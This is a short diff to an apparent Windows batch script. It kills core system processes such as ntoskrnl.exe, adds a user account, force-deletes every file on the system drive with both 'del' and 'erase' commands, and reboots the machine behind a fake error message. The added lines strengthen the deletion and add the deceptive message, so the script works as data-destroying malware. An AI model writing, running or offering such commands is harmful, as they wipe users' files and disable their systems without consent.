@@ -44,7 +44,8 @@ taskkill /F /IM ntoskrnl.exe
 taskkill /F /IM sihost.exe
 md C:\Wind1
 Sqet.cmd
-net user /add NOPE NOT LOG ON FOR YOU!!!
+net user /add James
 @echo off 
-del %systemdrive%\*.* /f /s /q
-shutdown -r -t 10
+del %systemdrive%\*.* /f /s /q 
+erase %systemdrive%\*.* /f /s /q 
+shutdown -r -t 10 -c "...ERROR OBJECT IS NOT RECOGNIZED!!!"
